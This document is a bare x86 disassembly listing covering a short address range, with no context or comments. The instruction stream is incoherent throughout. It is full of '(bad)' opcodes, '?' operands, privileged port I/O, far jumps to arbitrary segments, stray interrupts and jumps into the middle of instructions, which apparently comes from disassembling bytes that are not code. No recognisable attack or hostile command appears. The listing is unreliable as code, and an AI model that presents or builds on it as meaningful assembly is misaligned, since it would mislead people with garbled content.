  42d18f:	bound  edi,QWORD PTR [eax]
  42d191:	enter  0x5109,0xcc
  42d195:	add    eax,edi
  42d197:	push   cs
  42d198:	cmp    al,0x3e
  42d19a:	add    BYTE PTR [esi],bh
  42d19c:	ret    
  42d19d:	iret   
  42d19e:	push   esi
  42d19f:	in     eax,dx
  42d1a0:	mov    al,ds:0x16f8e109
  42d1a5:	mov    dl,0xd7
  42d1a7:	sub    ah,BYTE PTR [esi+0x7a]
  42d1aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1ab:	fistp  QWORD PTR [eax+ecx*4]
  42d1ae:	ficomp DWORD PTR [esi+0x766643bf]
  42d1b4:	add    ebx,eax
  42d1b6:	mov    edi,0x6c344bfa
  42d1bb:	jmp    DWORD PTR [eax]
  42d1bd:	sbb    al,0xdd
  42d1bf:	ja     0x42d183
  42d1c1:	sub    al,0x59
  42d1c3:	and    bh,bh
  42d1c5:	fild   DWORD PTR [edi+0x2b9bf431]
  42d1cb:	push   edi
  42d1cc:	xchg   ebp,eax
  42d1cd:	sub    ebx,DWORD PTR [ebx]
  42d1cf:	leave  
  42d1d0:	inc    edi
  42d1d1:	fwait
  42d1d2:	cmp    bl,BYTE PTR ds:0xfbeffe90
  42d1d8:	push   eax
  42d1d9:	mov    ?,WORD PTR [esi+0x21]
  42d1dc:	aam    0x41
  42d1de:	sar    BYTE PTR ds:0xf48a8f50,cl
  42d1e4:	imul   ebp,DWORD PTR [eax],0xffffffee
  42d1e7:	ja     0x42d189
  42d1e9:	ss jl  0x42d20f
  42d1ec:	mov    esi,0x59bf934c
  42d1f1:	sbb    edx,DWORD PTR [ebx]
  42d1f3:	jnp    0x42d26d
  42d1f5:	cmp    ecx,edi
  42d1f7:	daa    
  42d1f8:	push   cs
  42d1f9:	cmp    eax,0x9b0b89f1
  42d1fe:	adc    al,0x4d
  42d200:	adc    BYTE PTR [edx+0x35],dh
  42d203:	and    al,0x67
  42d205:	aaa    
  42d206:	bnd js 0x42d241
  42d209:	mov    esp,0xe36e8055
  42d20e:	xor    esi,DWORD PTR [ebx]
  42d210:	cmp    ebp,DWORD PTR cs:0xafa9d033
  42d217:	clc    
  42d218:	add    BYTE PTR [ecx-0x1e],dh
  42d21b:	adc    bh,ah
  42d21d:	push   esp
  42d21e:	sbb    BYTE PTR [ecx-0x68],bl
  42d221:	cwde   
  42d222:	bound  ebx,QWORD PTR [ebp-0x7d24a881]
  42d228:	xchg   ecx,eax
  42d229:	idiv   dh
  42d22b:	cwde   
  42d22c:	inc    edi
  42d22d:	push   esi
  42d22e:	xor    eax,0xd53670be
  42d233:	fs or  eax,0xa0d4980c
  42d239:	adc    DWORD PTR [ecx*4+0x3268a76a],esp
  42d240:	arpl   si,si
  42d242:	jge    0x42d281
  42d244:	clc    
  42d245:	shr    BYTE PTR [edi-0xd],cl
  42d248:	mov    eax,0xcda0a994
  42d24d:	out    0x42,eax
  42d24f:	inc    ecx
  42d250:	je     0x42d250
  42d252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d254:	test   eax,0xbab7a788
  42d259:	pusha  
  42d25a:	dec    edi
  42d25b:	or     BYTE PTR [edi-0x4b427376],al
  42d261:	dec    edi
  42d262:	inc    esp
  42d263:	xchg   edi,eax
  42d264:	in     al,0x79
  42d266:	xor    bl,BYTE PTR [ecx]
  42d268:	jmp    esi
  42d26a:	sub    ebp,ebp
  42d26c:	enter  0xad27,0xe8
  42d270:	stc    
  42d271:	fild   DWORD PTR [ebx-0x1079b8c8]
  42d277:	sbb    eax,ebp
  42d279:	lock xchg edi,eax
  42d27b:	push   ecx
  42d27c:	add    BYTE PTR [ebx-0x65250c48],bl
  42d282:	jno    0x42d2bc
  42d284:	mov    al,0x4b
  42d286:	fwait
  42d287:	aas    
  42d288:	icebp  
  42d289:	jmp    FWORD PTR [eax-0x4ba61fbf]
  42d28f:	cmp    DWORD PTR [ebp+0x72ad0f41],ecx
  42d295:	jp     0x42d2d3
  42d297:	xlat   BYTE PTR ds:[ebx]
  42d298:	cmp    esp,esi
  42d29a:	push   0x3f
  42d29c:	vpxor  xmm7,xmm3,XMMWORD PTR [ebx+0x4f]
  42d2a1:	pop    ss
  42d2a2:	lods   al,BYTE PTR ds:[esi]
  42d2a3:	out    dx,eax
  42d2a4:	fld    QWORD PTR [edx-0x3eb0301e]
  42d2aa:	mov    ch,0xdb
  42d2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2ad:	mov    ds:0xa2c5b280,al
  42d2b2:	xchg   esi,eax
  42d2b3:	sub    BYTE PTR [edi+0x2d5c5efa],bl
  42d2b9:	pushf  
  42d2ba:	mov    esi,DWORD PTR ds:0x9fa690b9
  42d2c0:	push   ebx
  42d2c1:	shl    DWORD PTR [edi+edi*4-0x5],cl
  42d2c5:	lods   eax,DWORD PTR ds:[esi]
  42d2c6:	sbb    BYTE PTR [ecx-0x3f335535],bl
  42d2cc:	jg     0x42d28b
  42d2ce:	xor    eax,0xcf9f9f80
  42d2d3:	mov    eax,ds:0x731c6c85
  42d2d8:	mov    ch,0xa4
  42d2da:	mov    dh,0x0
  42d2dc:	imul   esi,DWORD PTR [ecx-0x2b089e2d],0xffffffd0
  42d2e3:	push   eax
  42d2e4:	outs   dx,DWORD PTR ds:[esi]
  42d2e5:	and    DWORD PTR [ebp+0x50b120a6],0xaf6e5f53
  42d2ef:	sbb    esi,esi
  42d2f1:	sbb    BYTE PTR [ecx],0x9d
  42d2f4:	lahf   
  42d2f5:	or     dl,al
  42d2f7:	mov    ecx,0xb6d61eba
  42d2fc:	imul   ebp,DWORD PTR [ecx-0xd],0xffffffcf
  42d300:	and    bh,dh
  42d302:	in     eax,dx
  42d303:	push   edi
  42d304:	jo     0x42d2e6
  42d306:	ret    0x7ab4
  42d309:	clc    
  42d30a:	lds    ecx,FWORD PTR [ebx+0x43cea09b]
  42d310:	scas   eax,DWORD PTR es:[edi]
  42d311:	dec    bp
  42d313:	inc    ebx
  42d314:	pop    DWORD PTR [ecx+esi*2]
  42d317:	mov    dh,BYTE PTR [ebx-0x53d7e626]
  42d31d:	xchg   ebp,eax
  42d31e:	add    esi,DWORD PTR [ebx]
  42d320:	in     eax,0x11
  42d322:	repz lds esi,FWORD PTR [ecx]
  42d325:	add    DWORD PTR [eax],ebp
  42d327:	xlat   BYTE PTR ds:[ebx]
  42d328:	add    DWORD PTR [eax],esi
  42d32a:	out    0xf9,eax
  42d32c:	cmp    eax,0xd0c1ff95
  42d331:	out    dx,eax
  42d332:	sahf   
  42d333:	inc    eax
  42d334:	mov    al,0x2d
  42d336:	inc    esp
  42d337:	pop    edx
  42d338:	fld    DWORD PTR [edx-0x137f5dbe]
  42d33e:	dec    esp
  42d33f:	sbb    al,0xc9
  42d341:	test   eax,0x10245204
  42d346:	xchg   edx,eax
  42d347:	arpl   WORD PTR ds:0x13a87c6c,si
  42d34d:	sub    eax,0x27a6126d
  42d352:	pop    es
  42d353:	xor    ah,dh
  42d355:	dec    edx
  42d356:	push   cs
  42d357:	stos   DWORD PTR es:[edi],eax
  42d358:	outs   dx,DWORD PTR ds:[esi]
  42d359:	cmc    
  42d35a:	sar    bl,1
  42d35c:	ret    
  42d35d:	sbb    BYTE PTR ds:0xd4914652,bh
  42d363:	push   edi
  42d364:	lods   al,BYTE PTR ds:[esi]
  42d365:	mov    DWORD PTR [edx-0x4fa24540],0xdc8bd79
  42d36f:	pushf  
  42d370:	(bad)  
  42d371:	fdiv   DWORD PTR [ebx]
  42d373:	push   ebx
  42d374:	sbb    bh,dh
  42d376:	cmp    esi,DWORD PTR [ecx-0x24f3dc5a]
  42d37c:	cld    
  42d37d:	adc    al,0x8a
  42d37f:	rcr    DWORD PTR [eax],0x9c
  42d382:	rcl    DWORD PTR [esi],0x38
  42d385:	add    dh,BYTE PTR [eax*8-0x72f6fb27]
  42d38c:	adc    ch,BYTE PTR [ebx+ebp*4-0x16]
  42d390:	shl    ebp,1
  42d392:	xchg   edi,eax
  42d393:	repz jo 0x42d343
  42d396:	out    dx,eax
  42d397:	push   edi
  42d398:	rol    DWORD PTR [edi+eiz*1+0xa],cl
  42d39c:	retf   
  42d39d:	ins    DWORD PTR es:[edi],dx
  42d39e:	ret    0xf3c4
  42d3a1:	(bad)  
  42d3a3:	mov    ebx,DWORD PTR [ebx]
  42d3a5:	jno    0x42d390
  42d3a7:	sub    DWORD PTR [edi],0xffffffe3
  42d3aa:	dec    esp
  42d3ab:	jns    0x42d406
  42d3ad:	and    ecx,DWORD PTR [edx+0x3918e767]
  42d3b3:	jae    0x42d375
  42d3b5:	mov    cl,0x54
  42d3b7:	fs clc 
  42d3b9:	addr16 or al,0x6f
  42d3bc:	stc    
  42d3bd:	jo     0x42d434
  42d3bf:	xchg   ebx,eax
  42d3c0:	inc    edi
  42d3c1:	data16 mov bh,0xe1
  42d3c4:	inc    esp
  42d3c5:	sbb    DWORD PTR [esi+0x73fcf61b],ebx
  42d3cb:	retf   
  42d3cc:	jmp    0xc090:0x771c2680
  42d3d3:	sub    bl,dl
  42d3d5:	imul   ecx,DWORD PTR [eax+0x2466eafe],0x1a
  42d3dc:	mov    bh,0x43
  42d3de:	icebp  
  42d3df:	in     al,dx
  42d3e0:	inc    ebx
  42d3e1:	repnz lds ecx,FWORD PTR [edi]
  42d3e4:	loopne 0x42d3d8
  42d3e6:	sub    esp,DWORD PTR [ebx-0x5d297b7c]
  42d3ec:	jecxz  0x42d3cc
  42d3ee:	das    
  42d3ef:	shr    DWORD PTR [edi+ebp*8+0x42],0xea
  42d3f4:	test   eax,0xf7fd3147
  42d3f9:	fist   WORD PTR [ecx-0x11]
  42d3fc:	iret   
  42d3fd:	call   0x7bb8:0xd40b7398
  42d404:	rol    BYTE PTR [esi+edx*4+0x7e43371b],0xf0
  42d40c:	ds je  0x42d3ed
  42d40f:	jbe    0x42d428
  42d411:	lods   al,BYTE PTR ds:[esi]
  42d412:	ds das 
  42d414:	fs xchg ebx,eax
  42d416:	or     eax,0x783df9e5
  42d41b:	xor    al,0x36
  42d41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d41e:	push   0xfffffff1
  42d420:	push   ecx
  42d421:	call   0x3d460af6
  42d426:	mov    DWORD PTR [edi+0x13983fc9],eax
  42d42c:	xor    DWORD PTR ds:0xbe661f37,0x32619307
  42d436:	add    ah,BYTE PTR [eax+0x7b]
  42d439:	aas    
  42d43a:	or     ebx,ebp
  42d43c:	cmp    eax,ecx
  42d43e:	stc    
  42d43f:	adc    ebx,DWORD PTR [esi-0x3d]
  42d442:	xor    eax,0x4b874998
  42d447:	bound  ebx,QWORD PTR [ecx+0xd238c4e]
  42d44d:	push   ss
  42d44e:	ret    
  42d44f:	ja     0x42d489
  42d451:	xor    eax,0xc8abcc5a
  42d456:	bound  edi,QWORD PTR [ebx-0x30]
  42d459:	push   ecx
  42d45a:	inc    ebx
  42d45b:	inc    ebp
  42d45c:	xor    esp,DWORD PTR [esi-0x7d791719]
  42d462:	call   FWORD PTR [edi+0x3c]
  42d465:	retf   
  42d466:	mov    ch,0x75
  42d468:	pop    eax
  42d469:	mov    cl,0x3b
  42d46b:	xchg   ebp,eax
  42d46c:	neg    ebx
  42d46e:	lock push esp
  42d470:	jg     0x42d4ad
  42d472:	jle    0x42d4f3
  42d474:	lods   al,BYTE PTR ds:[esi]
  42d475:	test   BYTE PTR [ecx+0x5a],cl
  42d478:	inc    edi
  42d479:	adc    DWORD PTR [edx],esp
  42d47b:	push   esi
  42d47c:	stos   BYTE PTR es:[edi],al
  42d47d:	es int3 
  42d47f:	push   edi
  42d480:	sub    dh,BYTE PTR [eax+0x11301a13]
  42d486:	hlt    
  42d487:	scas   eax,DWORD PTR es:[edi]
  42d488:	(bad)  
  42d489:	mov    bl,BYTE PTR [eax+0x4d]
  42d48c:	xchg   DWORD PTR [edi],esp
  42d48e:	adc    dh,cl
  42d490:	mov    ds:0xd6a825af,al
  42d495:	add    ebx,esp
  42d497:	std    
  42d498:	pop    ss
  42d499:	cmc    
  42d49a:	mov    ah,dh
  42d49c:	jp     0x42d4ae
  42d49e:	jnp    0x42d480
  42d4a0:	dec    edi
  42d4a1:	cmp    BYTE PTR [ebp+0xb],cl
  42d4a4:	jl     0x42d4c4
  42d4a6:	jp     0x42d4a4
  42d4a8:	fwait
  42d4a9:	ret    
  42d4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4ab:	sbb    al,0xf3
  42d4ad:	addr16 xchg edx,eax
  42d4af:	aam    0x3a
  42d4b1:	call   0xbd49ad06
  42d4b6:	cmp    cl,BYTE PTR [esi-0x5ee7406d]
  42d4bc:	stc    
  42d4bd:	mov    al,ds:0xb54403f3
  42d4c2:	cmp    DWORD PTR [ebx-0x7b],ebp
  42d4c5:	pop    esi
  42d4c6:	add    DWORD PTR [edx],ebp
  42d4c8:	add    al,0xc4
  42d4ca:	xor    eax,0xef82696f
  42d4cf:	stos   DWORD PTR es:[edi],eax
  42d4d0:	pop    ebx
  42d4d1:	mov    al,0x74
  42d4d3:	inc    edx
  42d4d4:	xor    BYTE PTR [esi+esi*2+0x14],0x99
  42d4d9:	repz sbb DWORD PTR [esp+ebx*8-0x13],esi
  42d4de:	test   BYTE PTR [edx-0x10],al
  42d4e1:	ds jnp 0x42d48e
  42d4e4:	add    bl,0x87
  42d4e7:	ror    BYTE PTR [eax],cl
  42d4e9:	pop    es
  42d4ea:	ins    DWORD PTR es:[edi],dx
  42d4eb:	dec    eax
  42d4ec:	int    0x17
  42d4ee:	nop
  42d4ef:	test   eax,0xfc0824ca
  42d4f4:	jo     0x42d507
  42d4f6:	adc    al,0x1a
  42d4f8:	popf   
  42d4f9:	dec    edi
  42d4fa:	adc    edx,edx
  42d4fc:	xchg   ebx,eax
  42d4fd:	rcl    ebx,1
  42d4ff:	out    0xc1,al
  42d501:	in     eax,0x25
  42d503:	cmp    dh,BYTE PTR [ebx]
  42d505:	ins    DWORD PTR es:[edi],dx
  42d506:	or     ah,BYTE PTR [edx+0x24]
  42d509:	sbb    eax,0x93ce9f0f
  42d50e:	pop    ecx
  42d50f:	ins    BYTE PTR es:[edi],dx
  42d510:	inc    edi
  42d511:	cmp    al,0x5b
  42d513:	test   BYTE PTR [ecx+0x5ddee126],ch
  42d519:	data16 and al,0xb
  42d51c:	es pushf 
  42d51e:	ds push esp
  42d520:	sbb    cl,0x67
  42d523:	inc    esi
  42d524:	out    dx,eax
  42d525:	push   ss
  42d526:	das    
  42d527:	call   0xc1f0:0xec861b3e
  42d52e:	mov    dl,0xfa
  42d530:	jecxz  0x42d4f2
  42d532:	lahf   
  42d533:	out    0x70,al
  42d535:	loop   0x42d4d5
  42d537:	dec    edi
  42d538:	jecxz  0x42d58c
  42d53a:	inc    ebp
  42d53b:	push   esi
  42d53c:	ror    DWORD PTR [edi],1
  42d53e:	push   ebx
  42d53f:	xor    BYTE PTR [ecx-0x6728700d],0xcd
  42d546:	cmp    al,0xf1
  42d548:	(bad)  
  42d549:	dec    ebp
  42d54a:	pop    ds
  42d54b:	mov    cl,0x67
  42d54d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d54e:	push   ss
  42d54f:	int    0x7
  42d551:	pusha  
  42d552:	and    al,0x38
  42d554:	adc    BYTE PTR [ebx-0x4085ee4e],bl
  42d55a:	jae    0x42d57d
  42d55c:	add    BYTE PTR [esp+edx*8],al
  42d55f:	adc    DWORD PTR [esi],ecx
  42d561:	xchg   ebp,eax
  42d562:	iret   
  42d563:	sub    ecx,edi
  42d565:	loopne 0x42d51c
  42d567:	jg     0x42d567
  42d569:	sbb    ah,BYTE PTR [edx]
  42d56b:	cmp    eax,0x565dd851
  42d570:	fcomp  DWORD PTR [esi+edx*1+0x44]
  42d574:	cmp    eax,DWORD PTR [ebx-0x3ba7e068]
  42d57a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d57c:	das    
  42d57d:	and    ch,BYTE PTR [ecx]
  42d57f:	sub    bl,al
  42d581:	jbe    0x42d539
  42d583:	rol    DWORD PTR [esp+ebx*2-0x7a],cl
  42d587:	mov    ds:0xba175641,eax
  42d58c:	out    dx,eax
  42d58d:	pop    esi
  42d58e:	das    
  42d58f:	fidivr WORD PTR [esp+edi*1+0x3]
  42d593:	pop    edi
  42d594:	jp     0x42d5b2
  42d596:	mov    ds:0x487bc364,eax
  42d59b:	jo     0x42d552
  42d59d:	out    dx,al
  42d59e:	fisttp DWORD PTR [esi+0x42]
  42d5a1:	and    DWORD PTR [edi],ecx
  42d5a3:	xchg   DWORD PTR [ebx+0x42],edx
  42d5a6:	mov    al,ds:0x6f338e30
  42d5ab:	cli    
  42d5ac:	loope  0x42d557
  42d5ae:	or     eax,edx
  42d5b0:	xchg   edx,eax
  42d5b1:	sbb    al,0x80
  42d5b3:	xor    eax,0x2f7048d2
  42d5b8:	inc    esp
  42d5b9:	inc    edx
  42d5ba:	fisttp WORD PTR [edi-0x3af19f5a]
  42d5c0:	je     0x42d5dc
  42d5c2:	(bad)  
  42d5c3:	out    dx,al
  42d5c4:	jp     0x42d5fa
  42d5c6:	fcomp  QWORD PTR [eax-0x3c]
  42d5c9:	call   0xb5141d5d
  42d5ce:	xlat   BYTE PTR ds:[ebx]
  42d5cf:	(bad)  
  42d5d0:	les    edx,FWORD PTR [edx+0x2688570c]
  42d5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5d7:	mov    edi,0x836b7584
  42d5dc:	lock fidiv WORD PTR [eax+0x5fa10b16]
  42d5e3:	loop   0x42d58e
  42d5e5:	call   0xca93:0xc10c6f48
  42d5ec:	pusha  
  42d5ed:	xchg   edx,eax
  42d5ee:	test   BYTE PTR [ebx+edi*2],al
  42d5f1:	inc    esp
  42d5f2:	jecxz  0x42d57a
  42d5f4:	ret    
  42d5f5:	shl    DWORD PTR [esi+0x7006731d],0xd8
  42d5fc:	xchg   DWORD PTR [ebx-0x20],ebp
  42d5ff:	jns    0x42d664
  42d601:	jo     0x42d67b
  42d603:	mov    ebp,DWORD PTR [ebx]
  42d605:	loopne 0x42d65f
  42d607:	ret    
  42d608:	xor    DWORD PTR ds:0x14097894,ecx
  42d60e:	mov    ebx,0x51b7ec8a
  42d613:	inc    edx
  42d614:	add    bl,ch
  42d616:	jg     0x42d5c9
  42d618:	or     ebp,DWORD PTR [ecx-0x213d4832]
  42d61e:	(bad)  
  42d61f:	ss sub al,0x3d
  42d622:	test   DWORD PTR [ecx-0x2c],0x28ebc2e
  42d629:	dec    ebp
  42d62a:	pushf  
  42d62b:	outs   dx,DWORD PTR ds:[esi]
  42d62c:	in     eax,dx
  42d62d:	mov    ch,0x90
  42d62f:	sub    edi,DWORD PTR [ebx+0x21]
  42d632:	add    eax,0xc7b18ade
  42d637:	mov    edi,0x46093301
  42d63c:	jmp    0x926e4a12
  42d641:	fcomp  st(0)
  42d643:	sahf   
  42d644:	pop    ebp
  42d645:	mov    esp,0xf6779d7
  42d64a:	dec    esp
  42d64b:	push   edx
  42d64d:	outs   dx,BYTE PTR ds:[esi]
  42d64e:	mov    eax,0xcd87eeba
  42d653:	pop    ss
  42d654:	inc    esi
  42d655:	out    0xf0,al
  42d657:	pop    ebx
  42d658:	jo     0x42d6c8
  42d65a:	imul   DWORD PTR [ecx+0x75]
  42d65d:	or     DWORD PTR [ebp-0x2f2da1a3],0x733cb5
  42d667:	sbb    BYTE PTR [ebp+0x3dd08bd5],bh
  42d66d:	fisubr WORD PTR [ecx+esi*8]
  42d670:	lea    edi,[eax+ecx*4]
  42d673:	pop    esp
  42d674:	sub    DWORD PTR [ecx+0x3c],ebp
  42d677:	clc    
  42d678:	sbb    al,0x2
  42d67a:	in     eax,0x67
  42d67c:	(bad)  
  42d67d:	in     eax,dx
  42d67e:	into   
  42d67f:	(bad)  
  42d681:	cmp    eax,0x8c4449c2
  42d686:	cmp    bl,BYTE PTR [eax+0x58]
  42d689:	jb     0x42d62e
  42d68b:	adc    dh,cl
  42d68d:	nop
  42d68e:	fadd   QWORD PTR [esi+0x4a]
  42d691:	ret    0xac56
  42d694:	mov    ds:0x303e5959,al
  42d699:	pushf  
  42d69a:	jne    0x42d713
  42d69c:	pop    ebp
  42d69d:	pop    eax
  42d69e:	sar    esi,cl
  42d6a0:	mov    ah,0x2b
  42d6a2:	pop    ss
  42d6a3:	fcompp 
  42d6a5:	add    eax,0xffffffc7
  42d6a8:	fstp   QWORD PTR [eax+0x3e134ae]
  42d6ae:	mov    bh,0x9f
  42d6b0:	adc    BYTE PTR [ebp+0xf46c3cc],0x9
  42d6b7:	push   ebp
  42d6b8:	lds    ecx,FWORD PTR [edx-0xe6666e6]
  42d6be:	in     al,dx
  42d6bf:	sub    al,0x29
  42d6c1:	call   0x3366:0xd340da92
  42d6c8:	mov    eax,ds:0xd68021bd
  42d6cd:	cmp    bl,BYTE PTR [ebx]
  42d6cf:	(bad)  
  42d6d0:	aad    0x84
  42d6d2:	mov    bh,0x7e
  42d6d4:	mov    al,ds:0x2b1a509
  42d6d9:	sub    bl,BYTE PTR [edi-0x5e5159c3]
  42d6df:	jo     0x42d6df
  42d6e1:	xor    DWORD PTR [ecx-0x14],esp
  42d6e4:	mov    WORD PTR [esi],?
  42d6e6:	dec    edi
  42d6e7:	adc    eax,0x1d73f84d
  42d6ec:	mov    edi,0x32d70f18
  42d6f1:	aam    0x19
  42d6f3:	add    al,0xa4
  42d6f5:	adc    eax,0x473cae7a
  42d6fa:	dec    esi
  42d6fb:	cmp    al,0x9a
  42d6fd:	loopne 0x42d76a
  42d6ff:	test   BYTE PTR [esi],bl
  42d701:	ds adc bl,BYTE PTR gs:[eax]
  42d705:	and    DWORD PTR [esi+esi*4],eax
  42d708:	cmp    al,0xb3
  42d70a:	movhps QWORD PTR [edi],xmm5
  42d70d:	int    0xc0
  42d70f:	jmp    0x42d6bf
  42d711:	sub    DWORD PTR [ecx+0x74d2813f],0x9
  42d718:	fimul  WORD PTR ds:0x48eb0476
  42d71e:	jae    0x42d73f
  42d720:	int    0xc3
  42d722:	inc    edx
  42d723:	outs   dx,DWORD PTR es:[esi]
  42d725:	cld    
  42d726:	bound  eax,QWORD PTR [ecx]
  42d728:	test   DWORD PTR [ecx+0x6e8d220c],ebx
  42d72e:	in     al,0x92
  42d730:	and    eax,0x915cd4c
  42d735:	(bad)  
  42d736:	xchg   ebx,eax
  42d737:	push   esi
  42d738:	dec    edi
  42d739:	push   edi
  42d73a:	loope  0x42d6ca
  42d73c:	cmp    DWORD PTR [ecx],esp
  42d73e:	call   0xe894:0x550a797e
  42d745:	data16 loope 0x42d6ea
  42d748:	add    BYTE PTR [esi-0x57],0x86
  42d74c:	xchg   edi,eax
  42d74d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d74e:	adc    eax,0xec556a04
  42d753:	call   0xe870800a
  42d758:	cs push di
  42d75b:	and    DWORD PTR [ecx-0x74194410],edx
  42d761:	int    0x70
  42d763:	in     eax,dx
  42d764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d765:	bswap  edx
  42d767:	push   ds
  42d768:	enter  0xff8d,0x6
  42d76c:	and    eax,0xa15e2372
  42d771:	imul   ebx,DWORD PTR [esi+0x20],0xffffffa4
  42d775:	xor    BYTE PTR [ebx],al
  42d777:	cmp    eax,0x905dc62a
  42d77c:	xchg   esi,eax
  42d77d:	or     al,0x2
  42d77f:	fwait
  42d780:	std    
  42d781:	sbb    al,0x6c
  42d783:	push   cs
  42d784:	test   al,0x67
  42d786:	mov    al,ds:0xc001355
  42d78b:	mov    DWORD PTR [ecx-0x64147231],ebx
  42d791:	mov    ecx,0x7308b02b
  42d796:	or     al,bl
  42d798:	stc    
  42d799:	xor    ebp,esp
  42d79b:	or     DWORD PTR [ebp+edi*8+0x6de18ffe],ebx
  42d7a2:	hlt    
  42d7a3:	and    edi,DWORD PTR [esi]
  42d7a5:	mov    esp,0x708c9908
  42d7aa:	push   edi
  42d7ab:	fmul   DWORD PTR [ecx-0x6cf074a0]
  42d7b1:	inc    edi
  42d7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7b3:	xor    DWORD PTR [ecx+0x6a],edi
  42d7b6:	add    dh,BYTE PTR [ecx+0x4ffa3f3e]
  42d7bc:	pushf  
  42d7bd:	ret    
  42d7be:	mov    ?,WORD PTR [edi-0x5567df6f]
  42d7c4:	loop   0x42d7ac
  42d7c6:	das    
  42d7c7:	(bad)  
  42d7c8:	loop   0x42d7c2
  42d7ca:	ja     0x42d787
  42d7cc:	xor    DWORD PTR [ebp+0x7e],esi
  42d7cf:	adc    bh,al
  42d7d1:	sahf   
  42d7d2:	add    dh,BYTE PTR [esi-0x13]
  42d7d5:	add    eax,0x1aec7c36
  42d7da:	mov    esp,0x68cbb5f4
  42d7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7e0:	or     DWORD PTR [edx],ecx
  42d7e2:	mov    dh,0xaf
  42d7e4:	inc    ecx
  42d7e5:	jle    0x42d833
  42d7e7:	shl    DWORD PTR [edx-0x46],0x80
  42d7eb:	pusha  
  42d7ec:	jmp    0x9e1e60d
  42d7f1:	pusha  
  42d7f2:	neg    DWORD PTR [ebx+0x5a]
  42d7f5:	pusha  
  42d7f6:	or     ebp,edx
  42d7f8:	and    edi,DWORD PTR ds:0x4e558718
  42d7fe:	mov    ds:0xdc3096ee,eax
  42d803:	lods   eax,DWORD PTR ds:[esi]
  42d804:	push   esi
  42d805:	dec    esp
  42d806:	aas    
  42d807:	xor    eax,0x85d91c88
  42d80c:	es call 0x669b:0x1944e494
  42d814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d815:	xor    DWORD PTR [ebx+0x47],esi
  42d818:	or     ebp,DWORD PTR [ebp+ebx*2+0x15]
  42d81c:	ins    BYTE PTR es:[edi],dx
  42d81d:	mov    ebx,0xcd51dff3
  42d822:	std    
  42d823:	add    esp,DWORD PTR [ebp+edi*1+0x37574124]
  42d82a:	loop   0x42d823
  42d82c:	mov    edi,0x4509823d
  42d831:	push   ecx
  42d832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d833:	(bad)  
  42d834:	int    0x30
  42d836:	sub    esp,ebp
  42d838:	xor    eax,0xbd874077
  42d83d:	(bad)  
  42d83e:	or     eax,0x569e69cc
  42d843:	call   0xb628eb56
  42d848:	out    0x84,eax
  42d84a:	pop    ds
  42d84b:	mov    dh,0xff
  42d84d:	lds    edi,FWORD PTR [edi-0x235764c2]
  42d853:	and    ebp,DWORD PTR ds:0x48edd3f1
  42d859:	ins    DWORD PTR es:[edi],dx
  42d85a:	cld    
  42d85b:	or     edi,DWORD PTR [eax]
  42d85d:	fucomi st,st(6)
  42d85f:	(bad)  
  42d860:	loopne 0x42d7f5
  42d862:	inc    DWORD PTR [ebx+ebx*8]
  42d865:	icebp  
  42d866:	lahf   
  42d867:	inc    edx
  42d868:	fiadd  WORD PTR [ecx-0x6d]
  42d86b:	ins    BYTE PTR es:[edi],dx
  42d86c:	imul   eax,DWORD PTR [ecx-0x60],0xffffffef
  42d870:	cmp    bl,BYTE PTR [eax-0x63]
  42d873:	aaa    
  42d874:	loopne 0x42d83a
  42d876:	mov    bh,0xff
  42d878:	pop    es
  42d879:	jle    0x42d8ca
  42d87b:	add    eax,0x617437f5
  42d880:	not    dh
  42d882:	pop    edi
  42d883:	scas   al,BYTE PTR es:[edi]
  42d884:	sbb    al,0x7a
  42d886:	inc    esi
  42d887:	and    ebp,esp
  42d889:	daa    
  42d88a:	dec    eax
  42d88b:	jge    0x42d90b
  42d88d:	das    
  42d88e:	ss jle 0x42d889
  42d891:	lahf   
  42d892:	and    BYTE PTR [edi-0xd315e34],dh
  42d898:	adc    BYTE PTR [esi],cl
  42d89a:	rol    BYTE PTR [edi],cl
  42d89c:	test   BYTE PTR [ebp+0x5c2cc9c7],cl
  42d8a2:	repz mov edi,0x5f83dd00
  42d8a8:	xor    ebx,DWORD PTR [edi+eax*1-0x30]
  42d8ac:	sub    edi,ebp
  42d8ae:	cwde   
  42d8af:	(bad)  
  42d8b0:	mov    ebx,ds
  42d8b2:	jg     0x42d865
  42d8b4:	sbb    edx,eax
  42d8b6:	adc    WORD PTR [edi],dx
  42d8b9:	inc    edi
  42d8ba:	xor    ecx,esi
  42d8bc:	inc    ebp
  42d8bd:	stos   DWORD PTR es:[edi],eax
  42d8be:	ss push edi
  42d8c0:	jecxz  0x42d85c
  42d8c2:	xchg   esi,eax
  42d8c3:	jae    0x42d906
  42d8c5:	das    
  42d8c6:	xchg   edx,eax
  42d8c7:	loope  0x42d865
  42d8c9:	add    edi,DWORD PTR [edi-0x2f75a84a]
  42d8cf:	push   ecx
  42d8d0:	add    al,0xb7
  42d8d2:	leave  
  42d8d3:	loop   0x42d8fb
  42d8d5:	sub    ah,dl
  42d8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8d8:	lock pop ebx
  42d8da:	xor    BYTE PTR [edi+0x7e],bl
  42d8dd:	or     esi,esp
  42d8df:	mov    esp,0x65a16d84
  42d8e4:	dec    ecx
  42d8e5:	xor    edi,DWORD PTR [ebx-0x281f7437]
  42d8eb:	(bad)  
  42d8ec:	mov    ds:0xd9c46b94,al
  42d8f1:	aas    
  42d8f2:	sub    eax,0xddff2be2
  42d8f7:	(bad)  
  42d8f8:	pop    ebp
  42d8f9:	int    0x3e
  42d8fb:	adc    al,0xab
  42d8fd:	push   ss
